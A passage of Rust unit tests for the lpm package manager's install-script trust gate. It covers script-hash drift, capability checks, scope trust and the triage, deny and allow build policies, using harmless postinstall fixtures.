    );

    assert!(trusted);
}

#[test]
fn all_scripted_packages_trusted_false_when_any_unbuilt_scripted_package_is_untrusted() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("package.json"), r#"{"name":"demo"}"#).unwrap();

    let store = PackageStore::at(dir.path().join("store"));
    let lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
    write_store_package(
        &store,
        "sharp",
        "1.0.0",
        r#"{"postinstall":"node install.js"}"#,
        false,
    );

    let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
    let trusted = all_scripted_packages_trusted(
        &lpm_root,
        &[("sharp".to_string(), "1.0.0".to_string(), None)],
        &policy,
        dir.path(),
        ScriptPolicy::Deny,
        false,
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
        None,
    );

    assert!(!trusted);
}

#[test]
fn all_scripted_packages_trusted_ignores_already_built_untrusted_packages() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("package.json"),
        r#"{"lpm":{"trustedDependencies":["trusted-pkg"]}}"#,
    )
    .unwrap();

    let store = PackageStore::at(dir.path().join("store"));
    let lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
    write_store_package(
        &store,
        "trusted-pkg",
        "1.0.0",
        r#"{"postinstall":"node trusted.js"}"#,
        false,
    );
    write_store_package(
        &store,
        "blocked-pkg",
        "1.0.0",
        r#"{"postinstall":"node blocked.js"}"#,
        true,
    );

    let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));
    let trusted = all_scripted_packages_trusted(
        &lpm_root,
        &[
            ("trusted-pkg".to_string(), "1.0.0".to_string(), None),
            ("blocked-pkg".to_string(), "1.0.0".to_string(), None),
        ],
        &policy,
        dir.path(),
        ScriptPolicy::Deny,
        false,
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
        None,
    );

    assert!(
        trusted,
        "already-built untrusted packages should not block current auto-build decisions"
    );
}

// ───: drifted-rich-binding regressions ─────────────
//
// A rich entry whose stored `scriptHash` no longer matches what's on
// disk must NOT be treated as trusted by either the install hint (of
// the plan) or the auto-build predicate. Pre-migration,
// both used the lenient `policy.can_run_scripts(name)` gate and
// returned true for drifted entries, while `rebuild::run` itself
// would skip them — producing a confusing UX where install said
// "will auto-build" but build then refused. Now all three agree.

/// Build a project whose rich `trustedDependencies` entry for
/// `name@version` has a deliberately wrong `scriptHash`, so the
/// strict gate returns `BindingDrift`.
fn write_drifted_rich_project(dir: &Path, name: &str, version: &str) {
    std::fs::write(
        dir.join("package.json"),
        format!(
            r#"{{
                    "name": "proj",
                    "lpm": {{
                        "trustedDependencies": {{
                            "{name}@{version}": {{
                                "scriptHash": "sha256-not-the-real-hash-this-is-drift"
                            }}
                        }}
                    }}
                }}"#
        ),
    )
    .unwrap();
}

#[test]
fn show_install_hint_drifted_rich_binding_is_not_trusted() {
    // Drifted rich binding must NOT show as `trusted ✓` in the install hint.
    // We assert on the
    // pure `scriptable_package_rows` helper that
    // `show_install_build_hint` wraps — `is_trusted` is the
    // observable under test.
    let dir = tempfile::tempdir().unwrap();
    let store = PackageStore::at(dir.path().join("store"));
    let lpm_root = lpm_common::LpmRoot::from_dir(dir.path());

    write_store_package(
        &store,
        "sharp",
        "1.0.0",
        r#"{"postinstall":"node install.js"}"#,
        false,
    );
    // Sanity: the on-disk hash is SOME value; the rich binding
    // will name a different one. `compute_script_hash` is the
    // single source of truth for what's on disk.
    let on_disk = compute_script_hash(&store.package_dir("sharp", "1.0.0"))
        .expect("store package has an install-phase script");
    assert!(on_disk.starts_with("sha256-"));

    write_drifted_rich_project(dir.path(), "sharp", "1.0.0");
    let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));

    let rows = scriptable_package_rows(
        &lpm_root,
        &[("sharp".to_string(), "1.0.0".to_string(), None)],
        &policy,
        dir.path(),
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
    );
    assert_eq!(rows.len(), 1, "one scriptable row expected");
    assert_eq!(rows[0].name, "sharp");
    assert!(
        !rows[0].is_trusted,
        "drifted rich binding MUST NOT show as trusted in install hint \
             (the install UX must match `rebuild::run`'s skip behavior)"
    );
}

#[test]
fn all_scripted_packages_trusted_false_on_drifted_rich_binding() {
    // Drifted rich binding must NOT satisfy the auto-build "all trusted"
    // predicate. Otherwise
    // install would auto-trigger `rebuild::run` for a package
    // `rebuild::run` then immediately skips.
    let dir = tempfile::tempdir().unwrap();
    let store = PackageStore::at(dir.path().join("store"));
    let lpm_root = lpm_common::LpmRoot::from_dir(dir.path());

    write_store_package(
        &store,
        "sharp",
        "1.0.0",
        r#"{"postinstall":"node install.js"}"#,
        false,
    );
    write_drifted_rich_project(dir.path(), "sharp", "1.0.0");
    let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));

    let trusted = all_scripted_packages_trusted(
        &lpm_root,
        &[("sharp".to_string(), "1.0.0".to_string(), None)],
        &policy,
        dir.path(),
        ScriptPolicy::Deny,
        false,
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
        None,
    );
    assert!(
        !trusted,
        "drifted rich binding MUST NOT satisfy the auto-build \
             all-trusted predicate (previously true via name-only \
             gate; now false via strict gate, matching build::run)"
    );
}

#[test]
fn scriptable_rows_strict_match_is_trusted() {
    // Positive control: a rich binding whose `scriptHash` matches
    // the on-disk hash IS trusted. Proves the drift test above
    // is distinguishing "drifted rich binding" from "no rich
    // binding at all."
    let dir = tempfile::tempdir().unwrap();
    let store = PackageStore::at(dir.path().join("store"));
    let lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
    write_store_package(
        &store,
        "sharp",
        "1.0.0",
        r#"{"postinstall":"node install.js"}"#,
        false,
    );
    let on_disk_hash = compute_script_hash(&store.package_dir("sharp", "1.0.0")).unwrap();

    std::fs::write(
        dir.path().join("package.json"),
        format!(
            r#"{{
                    "name": "proj",
                    "lpm": {{
                        "trustedDependencies": {{
                            "sharp@1.0.0": {{
                                "scriptHash": "{on_disk_hash}"
                            }}
                        }}
                    }}
                }}"#
        ),
    )
    .unwrap();
    let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));

    let rows = scriptable_package_rows(
        &lpm_root,
        &[("sharp".to_string(), "1.0.0".to_string(), None)],
        &policy,
        dir.path(),
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
    );
    assert_eq!(rows.len(), 1);
    assert!(
        rows[0].is_trusted,
        "strict-match rich binding MUST show as trusted (positive control)"
    );
}

/// When the script-hash trust layer would grant trust but the
/// capability gate rejects, the install hint
/// must report `is_trusted = false`. Otherwise the hint lies
/// to the user about what `lpm rebuild` will actually do and
/// contradicts the adjacent approve-scripts guidance.
#[test]
fn install_hint_flips_to_untrusted_when_capability_gate_would_block() {
    use crate::capability::{CapabilitySet, ReadProjectMode, UserBound};

    let dir = tempfile::tempdir().unwrap();
    let store = PackageStore::at(dir.path().join("store"));
    let lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
    let pkg_dir = write_scripted_pkg(&store, "sharp", "1.0.0", "node install.js");
    let script_hash = compute_script_hash(&pkg_dir).expect("script hash");
    // Legacy None-capability_hash binding that matches strict.
    write_pkg_json_with_strict_approval(dir.path(), "sharp", "1.0.0", &script_hash);
    let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));

    // With baseline capability request: hint says trusted.
    let rows_baseline = scriptable_package_rows(
        &lpm_root,
        &[("sharp".to_string(), "1.0.0".to_string(), None)],
        &policy,
        dir.path(),
        &CapabilitySet::default(),
        &UserBound::default(),
    );
    assert_eq!(rows_baseline.len(), 1);
    assert!(
        rows_baseline[0].is_trusted,
        "baseline request + strict-match = trusted (positive control)"
    );

    // With widening capability request: hint MUST say NOT
    // trusted, because rebuild::run will skip with
    // CapabilityNotApproved.
    let widening = CapabilitySet {
        pass_env: ["SSH_AUTH_SOCK".into()].into_iter().collect(),
        read_project: ReadProjectMode::Narrow,
        sandbox_limits: Default::default(),
    };
    let rows_widening = scriptable_package_rows(
        &lpm_root,
        &[("sharp".to_string(), "1.0.0".to_string(), None)],
        &policy,
        dir.path(),
        &widening,
        &UserBound::default(),
    );
    assert_eq!(rows_widening.len(), 1);
    assert!(
        !rows_widening[0].is_trusted,
        "widening request + legacy binding = NOT trusted; \
             hint must agree with the capability gate's verdict"
    );
}

// ── warn_stale_trusted_deps tests ───────────────────────────

#[test]
fn stale_detection_finds_packages_without_scripts() {
    // trusted_dependencies is now TrustedDependencies::Legacy
    // (or Rich). Construct the Legacy variant directly to preserve the
    // existing test semantic.
    let policy = SecurityPolicy {
        trusted_dependencies: lpm_security::TrustedDependencies::Legacy(vec![
            "sharp".into(),
            "esbuild".into(),
            "phantom".into(),
        ]),
        minimum_release_age_secs: 0,
    };
    let scriptable = [
        ScriptablePackage {
            name: "sharp".into(),
            version: "0.33.0".into(),
            source: None,
            integrity: None,
            wrapper_id: None,
            store_path: std::path::PathBuf::new(),
            pristine_path: std::path::PathBuf::new(),
            source_integrity: "sha512-unused".into(),
            graph_key_digest: None,
            scripts: HashMap::from([("postinstall".into(), "node setup".into())]),
            is_built: false,
            build_marker_key: None,
            is_trusted: true,
            trust_reason: TrustReason::StrictBinding,
        },
        ScriptablePackage {
            name: "esbuild".into(),
            version: "0.21.0".into(),
            source: None,
            integrity: None,
            wrapper_id: None,
            store_path: std::path::PathBuf::new(),
            pristine_path: std::path::PathBuf::new(),
            source_integrity: "sha512-unused".into(),
            graph_key_digest: None,
            scripts: HashMap::from([("postinstall".into(), "node install.js".into())]),
            is_built: false,
            build_marker_key: None,
            is_trusted: true,
            trust_reason: TrustReason::StrictBinding,
        },
    ];

    // "phantom" is trusted but has no scripts — should be detected as stale.
    // The iter() yields (name, optional binding) tuples; we only care
    // about the name for the staleness check.
    let scriptable_names: HashSet<&str> = scriptable.iter().map(|p| p.name.as_str()).collect();
    let mut stale: Vec<String> = policy
        .trusted_dependencies
        .iter()
        .filter_map(|(name, _binding)| {
            if scriptable_names.contains(name.as_str()) {
                None
            } else {
                Some(name)
            }
        })
        .collect();
    stale.sort();
    assert_eq!(stale, vec!["phantom".to_string()]);
}

// ── strict gate composition tests ──────────
//
// These tests exercise the trust-decision logic in isolation: given a
// SecurityPolicy and a (name, version, integrity, script_hash) tuple,
// does the strict gate produce the right TrustMatch and does the
// composition with `is_scope_trusted` produce the right `is_trusted`?
//
// The full pipeline (lockfile + store + script execution) needs network
// and a real fixture, which is out of scope for in-module unit tests.
// The full pipeline is covered via integration-style tests.

use lpm_security::{TrustMatch, TrustedDependencies, TrustedDependencyBinding};
use std::collections::HashMap as StdHashMap;

fn rich_policy_with(
    key: &str,
    integrity: Option<&str>,
    script_hash: Option<&str>,
) -> SecurityPolicy {
    let mut map = StdHashMap::new();
    map.insert(
        key.to_string(),
        TrustedDependencyBinding {
            integrity: integrity.map(String::from),
            script_hash: script_hash.map(String::from),
            ..Default::default()
        },
    );
    SecurityPolicy {
        trusted_dependencies: TrustedDependencies::Rich(map),
        minimum_release_age_secs: 0,
    }
}

#[test]
fn build_strict_gate_strict_match_runs_script() {
    let policy = rich_policy_with("esbuild@0.25.1", Some("sha512-x"), Some("sha256-y"));
    let trust =
        policy.can_run_scripts_strict("esbuild", "0.25.1", Some("sha512-x"), Some("sha256-y"));
    assert_eq!(trust, TrustMatch::Strict);
}

#[test]
fn build_strict_gate_drift_in_script_hash_blocks_script() {
    let policy = rich_policy_with("esbuild@0.25.1", Some("sha512-x"), Some("sha256-OLD"));
    let trust =
        policy.can_run_scripts_strict("esbuild", "0.25.1", Some("sha512-x"), Some("sha256-NEW"));
    assert!(matches!(trust, TrustMatch::BindingDrift { .. }));
}

#[test]
fn build_strict_gate_drift_in_integrity_blocks_script() {
    let policy = rich_policy_with("esbuild@0.25.1", Some("sha512-OLD"), Some("sha256-y"));
    let trust =
        policy.can_run_scripts_strict("esbuild", "0.25.1", Some("sha512-NEW"), Some("sha256-y"));
    assert!(matches!(trust, TrustMatch::BindingDrift { .. }));
}

#[test]
fn build_strict_gate_unknown_package_blocks_script() {
    let policy = rich_policy_with("esbuild@0.25.1", Some("sha512-x"), Some("sha256-y"));
    let trust = policy.can_run_scripts_strict("unknown", "1.0.0", None, Some("sha256-z"));
    assert_eq!(trust, TrustMatch::NotTrusted);
}

#[test]
fn build_strict_gate_legacy_bare_name_runs_with_warning() {
    let policy = SecurityPolicy {
        trusted_dependencies: TrustedDependencies::Legacy(vec!["esbuild".to_string()]),
        minimum_release_age_secs: 0,
    };
    let trust =
        policy.can_run_scripts_strict("esbuild", "0.25.1", Some("sha512-x"), Some("sha256-y"));
    assert_eq!(trust, TrustMatch::LegacyNameOnly);
}

#[test]
fn build_strict_gate_different_version_blocks_script() {
    // binds approvals to name@version. Approving 0.25.1 does
    // NOT carry over to 0.25.2 — the user must re-approve at the new
    // version (or the resolver picks the same one).
    let policy = rich_policy_with("esbuild@0.25.1", Some("sha512-x"), Some("sha256-y"));
    let trust =
        policy.can_run_scripts_strict("esbuild", "0.25.2", Some("sha512-x"), Some("sha256-y"));
    assert_eq!(trust, TrustMatch::NotTrusted);
}

/// After `upgrade_to_rich` writes a `<name>@*` migration sentinel
/// for a legacy `Vec<String>` trustedDependencies entry, the
/// strict gate MUST NOT auto-trust any concrete version of that
/// package. The user must approve the specific version via
/// `lpm approve-scripts`, which writes a `name@version` Rich
/// entry binding trust to `(integrity, script_hash)`.
///
/// The legacy `Vec<String>` form retains `LegacyNameOnly` because
/// that is an explicit user-authored shape; the `@*` sentinel is
/// auto-generated and never represented user consent to wildcard
/// trust.
#[test]
fn build_strict_gate_legacy_upgraded_at_star_does_not_auto_trust() {
    let mut td = TrustedDependencies::Legacy(vec!["esbuild".into()]);
    td.upgrade_to_rich();
    let policy = SecurityPolicy {
        trusted_dependencies: td,
        minimum_release_age_secs: 0,
    };
    let trust =
        policy.can_run_scripts_strict("esbuild", "0.25.1", Some("sha512-x"), Some("sha256-y"));
    assert_eq!(
        trust,
        TrustMatch::NotTrusted,
        "`@*` migration sentinels MUST NOT satisfy the strict gate; \
             the user must re-approve via `lpm approve-scripts` to \
             create a content-bound Rich entry."
    );
}

/// REGRESSION: the strict gate must compose correctly with the existing
/// `is_scope_trusted` glob path. A package matched by a
/// `lpm.scripts.trustedScopes` glob is trusted regardless of the
/// strict-gate result.
#[test]
fn build_strict_gate_or_scope_trusted_runs_script_via_scope() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(
        dir.path().join("package.json"),
        r#"{"lpm":{"scripts":{"trustedScopes":["@myorg/*"]}}}"#,
    )
    .unwrap();

    // No trustedDependencies entry → strict gate returns NotTrusted...
    let policy = SecurityPolicy::default_policy();
    let trust = policy.can_run_scripts_strict("@myorg/some-pkg", "1.0.0", None, Some("sha256-y"));
    assert_eq!(trust, TrustMatch::NotTrusted);

    // ...but is_scope_trusted approves via the @myorg/* glob.
    // The build pipeline composes them with OR, so the package is
    // trusted overall.
    assert!(is_scope_trusted("@myorg/some-pkg", dir.path()));
}

// ── triage-mode messaging swap ─────────────
//
// These tests pin two distinct invariants. Marker-string guards catch
// accidental message removal. Behavioral guards catch regressions where
// the warning block becomes unreachable because its counter is computed
// against an already-trust-filtered set.

#[test]
fn triage_pointer_routes_to_approve_scripts() {
    let src = include_str!(concat!(
        env!("CARGO_MANIFEST_DIR"),
        "/src/commands/rebuild/mod.rs"
    ));
    const TRIAGE_HEAD: &str = "if effective_policy == ScriptPolicy::Triage {";
    const APPROVE_POINTER: &str = "lpm approve-scripts";
    const LEGACY_POINTER: &str = "package.json > lpm > trustedDependencies";

    let triage_pos = src.find(TRIAGE_HEAD).unwrap_or_else(|| {
        panic!(
            "triage-branch marker `{TRIAGE_HEAD}` disappeared from rebuild::run — \
                 required this branch so triage users are pointed at \
                 `lpm approve-scripts` instead of editing trustedDependencies by hand. \
                 If the control flow was legitimately refactored, update this test \
                 with the new marker; if the triage branch was removed, that's a \
                 contract regression and needs a deliberate test update."
        )
    });
    let approve_pos = src[triage_pos..].find(APPROVE_POINTER).unwrap_or_else(|| {
        panic!(
            "`{APPROVE_POINTER}` pointer not found inside the triage branch — \
                 wires this specific next-step message for triage \
                 blocked-packages UX."
        )
    });
    // The legacy pointer must still exist (the `else` branch for
    // deny/allow); just not inside the triage branch we just found.
    let legacy_pos = src.find(LEGACY_POINTER).unwrap_or_else(|| {
        panic!(
            "legacy `{LEGACY_POINTER}` pointer was removed — deny-mode messaging \
                 must stay unchanged by contract (the existing pointer is still the \
                 honest next step under deny)."
        )
    });
    assert!(
        approve_pos < src.len() - triage_pos,
        "`{APPROVE_POINTER}` must appear AFTER the triage branch header, not before",
    );
    assert_ne!(
        legacy_pos, triage_pos,
        "legacy pointer must live in the else branch, not inside the triage arm",
    );
}

#[test]
fn auto_build_call_site_threads_effective_policy() {
    // Pin the install → auto-build handoff: both the trust predicate
    // and the `rebuild::run` call must carry the same resolved
    // effective policy. Without this invariant the tier-promotion
    // logic would never see triage at the auto-build site.
    let src = include_str!(concat!(
        env!("CARGO_MANIFEST_DIR"),
        "/src/commands/install/lifecycle.rs"
    ));
    const TRUST_CALL: &str = "crate::commands::rebuild::all_scripted_package_identities_trusted(";
    const REBUILD_CALL: &str = "crate::commands::rebuild::run_under_store_lock(";
    const POLICY_ARG: &str = "effective_policy";

    let trust_pos = src
        .find(TRUST_CALL)
        .unwrap_or_else(|| panic!("trust predicate call `{TRUST_CALL}` disappeared"));
    let rebuild_pos = src
        .find(REBUILD_CALL)
        .unwrap_or_else(|| panic!("auto-build call `{REBUILD_CALL}` disappeared"));
    let trust_window = &src[trust_pos..trust_pos.saturating_add(700).min(src.len())];
    let rebuild_window = &src[rebuild_pos..rebuild_pos.saturating_add(700).min(src.len())];

    assert!(
        trust_window.contains(POLICY_ARG),
        "`{TRUST_CALL}` must receive `{POLICY_ARG}` so the auto-build \
         decision uses the resolved install policy"
    );
    assert!(
        rebuild_window.contains(POLICY_ARG),
        "`{REBUILD_CALL}` must receive `{POLICY_ARG}` so the rebuild \
         execution path uses the same resolved install policy"
    );
}

/// Construct a `ScriptablePackage` with synthetic values. The
/// counter cares only about `is_built` and `is_trusted`; other
/// fields are irrelevant but must be populated to satisfy the
/// struct shape. `trust_reason` is derived from `is_trusted` so
/// the field always stays internally consistent with the boolean
/// — added it, and a test synthesizing a trusted package
/// with `TrustReason::Untrusted` would misrepresent the data
/// model even though the counter wouldn't notice.
fn synthetic_scriptable(name: &str, is_built: bool, is_trusted: bool) -> ScriptablePackage {
    ScriptablePackage {
        name: name.into(),
        version: "1.0.0".into(),
        source: None,
        integrity: None,
        wrapper_id: None,
        store_path: std::path::PathBuf::from("/unused"),
        pristine_path: std::path::PathBuf::from("/unused"),
        source_integrity: "sha512-unused".into(),
        graph_key_digest: None,
        scripts: HashMap::from([("postinstall".into(), "node x.js".into())]),
        is_built,
        build_marker_key: None,
        is_trusted,
        trust_reason: if is_trusted {
            TrustReason::StrictBinding
        } else {
            TrustReason::Untrusted
        },
    }
}

#[test]
fn rebuild_package_failure_message_names_package_and_error() {
    let pkg = synthetic_scriptable("green-native", false, true);
    let message = rebuild_package_failure_message(&pkg, &"live package directory missing");

    assert_eq!(
        message,
        "green-native@1.0.0 failed: live package directory missing"
    );
}

#[test]
fn count_untrusted_unbuilt_sees_untrusted_under_default_build() {
    // Behavioral regression guard. The previous inline counter was
    // `to_build.iter().filter(|p| !p.is_trusted).count()` AFTER
    // `to_build` was filtered to trusted-only in the default
    // branch — structurally always zero, so the "N package(s)
    // are not in trustedDependencies" warning never reached
    // users. This test locks the corrected contract: the
    // extracted helper reads from the pre-trust-filter set and
    // reports a nonzero count when untrusted scripted packages
    // exist.
    let pkgs = vec![
        synthetic_scriptable("trusted-a", false, true),
        synthetic_scriptable("untrusted-b", false, false),
        synthetic_scriptable("untrusted-c", false, false),
        synthetic_scriptable("already-built-untrusted", true, false),
    ];
    // Default path (no --force): already-built entries drop out.
    // Two unbuilt-untrusted remain.
    assert_eq!(count_untrusted_unbuilt(&pkgs, false), 2);
}

#[test]
fn count_untrusted_unbuilt_respects_force_flag() {
    // `--force` forces already-built packages back into the
    // candidate set. The counter must include them so the warning
    // reaches users in that flow too.
    let pkgs = vec![
        synthetic_scriptable("built-untrusted", true, false),
        synthetic_scriptable("built-trusted", true, true),
    ];
    assert_eq!(count_untrusted_unbuilt(&pkgs, false), 0);
    assert_eq!(count_untrusted_unbuilt(&pkgs, true), 1);
}

#[test]
fn count_untrusted_unbuilt_zero_when_all_trusted() {
    // Negative control: when every unbuilt scripted package is
    // trusted, the count is zero and the warning must stay silent.
    let pkgs = vec![
        synthetic_scriptable("a", false, true),
        synthetic_scriptable("b", false, true),
    ];
    assert_eq!(count_untrusted_unbuilt(&pkgs, false), 0);
}

// ── shared trust helper behavior ───────────
//
// These tests pin `evaluate_trust` under each effective policy ×
// static-tier combination that materially changes behavior. The
// helper is the only place where "green-tier auto-trust" is
// decided — both `rebuild::run` and the install-time
// `all_scripted_packages_trusted` migration route through here,
// so single-point coverage is sufficient for the policy decision.
// The composition of the decision with the surrounding control
// flow (which packages get skipped, what message prints, what
// gets sandboxed) is covered by `rebuild::run`'s integration tests
// in the integration tests.
//
// Every test writes a synthetic package into a temp store with
// real lifecycle scripts so `compute_script_hash` and the static-
// gate classifier produce live values — not stubs — matching how
// `rebuild::run` will invoke the helper in production.

/// Write a synthetic package into a `PackageStore` with the
/// given postinstall body, and return its path. The postinstall
/// body is what the static-gate classifier consumes, so tests
/// exercising green/amber/red tiers pick their body accordingly.
fn write_scripted_pkg(
    store: &PackageStore,
    name: &str,
    version: &str,
    postinstall: &str,
) -> std::path::PathBuf {
    let pkg_dir = store.package_dir(name, version);
    std::fs::create_dir_all(&pkg_dir).unwrap();
    std::fs::write(
            pkg_dir.join("package.json"),
            format!(
                r#"{{"name":"{name}","version":"{version}","scripts":{{"postinstall":"{postinstall}"}}}}"#,
            ),
        )
        .unwrap();
    // see `write_store_package`
    // for why `.integrity` is required for the v1 fallback in
    // `find_installed_package_baseline`.
    std::fs::write(pkg_dir.join(".integrity"), "sha512-test-fake").unwrap();
    pkg_dir
}

#[test]
fn triage_promotes_green_tier_without_manifest_binding() {
    // The core behavior: a package with a green-tier postinstall
    // (node-gyp rebuild — exact match in the Layer 1 allowlist),
    // no `trustedDependencies` entry, no scope match, lands on
    // `GreenTierUnderTriage` under Triage. This is the auto-trust
    // path — every other path either required manifest work or
    // didn't exist.
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("package.json"), r#"{"name":"proj"}"#).unwrap();
    let store = PackageStore::at(dir.path().join("store"));
    let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
    let pkg_dir = write_scripted_pkg(&store, "some-native-pkg", "1.0.0", "node-gyp rebuild");
    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
    let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));

    let reason = evaluate_trust(
        &pkg_dir,
        "some-native-pkg",
        "1.0.0",
        None,
        &scripts,
        &policy,
        dir.path(),
        ScriptPolicy::Triage,
        false,
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
        None,
    );
    assert_eq!(reason, TrustReason::GreenTierUnderTriage);
    assert!(reason.is_trusted());
}

#[test]
fn triage_does_not_auto_trust_node_delegate_without_manifest_binding() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("package.json"), r#"{"name":"proj"}"#).unwrap();
    let store = PackageStore::at(dir.path().join("store"));
    let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
    let pkg_dir = write_scripted_pkg(&store, "delegate-pkg", "1.0.0", "node setup.js");
    std::fs::write(pkg_dir.join("setup.js"), b"require('./payload.js')\n").unwrap();
    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
    let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));

    let reason = evaluate_trust(
        &pkg_dir,
        "delegate-pkg",
        "1.0.0",
        None,
        &scripts,
        &policy,
        dir.path(),
        ScriptPolicy::Triage,
        false,
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
        None,
    );
    assert_eq!(reason, TrustReason::Untrusted);
    assert!(!reason.is_trusted());
}

#[test]
fn deny_does_not_promote_green_tier_at_helper_level() {
    // Deny must stay deny: no promotion, regardless of tier.
    // Scope trust remains lower priority than strict binding drift.
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("package.json"), r#"{"name":"proj"}"#).unwrap();
    let store = PackageStore::at(dir.path().join("store"));
    let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
    let pkg_dir = write_scripted_pkg(&store, "some-native-pkg", "1.0.0", "node-gyp rebuild");
    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
    let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));

    let reason = evaluate_trust(
        &pkg_dir,
        "some-native-pkg",
        "1.0.0",
        None,
        &scripts,
        &policy,
        dir.path(),
        ScriptPolicy::Deny,
        false,
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
        None,
    );
    assert_eq!(reason, TrustReason::Untrusted);
    assert!(!reason.is_trusted());
}

#[test]
fn allow_does_not_promote_green_tier_at_helper_level() {
    // `allow` semantics (build everything regardless of trust)
    // are the caller's concern — `rebuild::run` / fold the
    // allow policy into its filter at the selection step, NOT by
    // changing trust assignment per package. The helper's job is
    // to return the decision based on manifest bindings, scope,
    // and (under triage) tier. Under allow, with no binding +
    // no scope + green tier, the helper still returns Untrusted;
    // whether scripts run is a separate layer. This keeps the
    // helper's contract single-purpose and prevents "allow"
    // semantics from leaking into the predicate
    // `all_scripted_packages_trusted` relies on .
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("package.json"), r#"{"name":"proj"}"#).unwrap();
    let store = PackageStore::at(dir.path().join("store"));
    let _lpm_root = lpm_common::LpmRoot::from_dir(dir.path());
    let pkg_dir = write_scripted_pkg(&store, "some-native-pkg", "1.0.0", "node-gyp rebuild");
    let scripts = read_lifecycle_scripts(&pkg_dir.join("package.json")).unwrap();
    let policy = SecurityPolicy::from_package_json(&dir.path().join("package.json"));

    let reason = evaluate_trust(
        &pkg_dir,
        "some-native-pkg",
        "1.0.0",
        None,
        &scripts,
        &policy,
        dir.path(),
        ScriptPolicy::Allow,
        false,
        &crate::capability::CapabilitySet::default(),
        &crate::capability::UserBound::default(),
        None,
    );
    assert_eq!(reason, TrustReason::Untrusted);
}

/// close-out — complementary caller-side
/// contract to [`allow_does_not_promote_green_tier_at_helper_level`].
///
/// The helper test above pins that `evaluate_trust` deliberately
/// ignores allow (its job is manifest-binding + scope + tier,
/// not policy-wide widening). This test pins the other half of
/// the split: the selection step at [`widen_to_build_by_policy`]
/// must fold allow into its widening rule. Together they
/// guarantee `is_trusted` computation stays single-purpose AND
/// the allow contract is honored at the CLI boundary.
#[test]
fn widen_to_build_by_policy_includes_untrusted_under_allow() {
    let pkgs = vec![
        synthetic_scriptable("trusted-a", false, true),
        synthetic_scriptable("untrusted-b", false, false),
        synthetic_scriptable("untrusted-c", false, false),
    ];

    let selected = widen_to_build_by_policy(&pkgs, false, ScriptPolicy::Allow);
    assert_eq!(
        selected.len(),
        3,
        "allow must widen the default-branch selection to every \
             scriptable package — spec",
    );
    // Prove inclusion by name (not just count) so a future
    // refactor that accidentally filters then pads can't pass.
    let names: Vec<&str> = selected.iter().map(|p| p.name.as_str()).collect();
    assert!(names.contains(&"trusted-a"));
    assert!(names.contains(&"untrusted-b"));
    assert!(names.contains(&"untrusted-c"));
}

/// Control under Deny — allow fix must not widen the
/// deny mode's selection. Deny keeps the existing filter-
/// to-trusted-only contract, which is what `rebuild::run` relied
/// on before extracted the helper.
#[test]
fn widen_to_build_by_policy_filters_to_trusted_under_deny() {
    let pkgs = vec![
        synthetic_scriptable("trusted-a", false, true),
        synthetic_scriptable("untrusted-b", false, false),
    ];

    let selected = widen_to_build_by_policy(&pkgs, false, ScriptPolicy::Deny);
    assert_eq!(selected.len(), 1);
    assert_eq!(selected[0].name, "trusted-a");
}

/// Control under Triage — the tier-promotion-to-trusted logic
/// lives inside [`evaluate_trust`] and is already reflected in
/// `is_trusted` by the time packages reach this helper.
/// [`widen_to_build_by_policy`] therefore treats triage
/// identically to deny at the selection step; the difference
/// between them is earlier, at the trust computation.
///
/// This pins that fix is allow-scoped and does NOT
/// widen triage beyond what `evaluate_trust` already promoted.
/// Triage widening beyond greens would break the strict drift floor (no new
/// execution authority without sandbox-verified triage).
#[test]
fn widen_to_build_by_policy_filters_to_trusted_under_triage() {
    let pkgs = vec![
        synthetic_scriptable("green-auto-promoted", false, true),
        synthetic_scriptable("amber-unpromoted", false, false),
    ];

    let selected = widen_to_build_by_policy(&pkgs, false, ScriptPolicy::Triage);
    assert_eq!(selected.len(), 1);
    assert_eq!(selected[0].name, "green-auto-promoted");
}

/// `--all` is the explicit escape hatch: widen to
/// every scriptable package regardless of trust. Locks that
/// contract against regression when the policy-aware branch is
/// added — the `all || policy == Allow` short-circuit must
/// honor BOTH inputs.
#[test]
fn widen_to_build_by_policy_all_flag_widens_under_every_policy() {
    let pkgs = vec![
        synthetic_scriptable("trusted-a", false, true),
        synthetic_scriptable("untrusted-b", false, false),
        synthetic_scriptable("untrusted-c", false, false),
    ];

    for policy in [
        ScriptPolicy::Deny,
        ScriptPolicy::Allow,
        ScriptPolicy::Triage,
    ] {
        let selected = widen_to_build_by_policy(&pkgs, true, policy);
        assert_eq!(
            selected.len(),
            3,
            "--all must widen regardless of policy — existing \
                 contract preserved. policy={policy:?}"
        );
    }
}

#[test]
fn triage_does_not_promote_amber_or_red() {
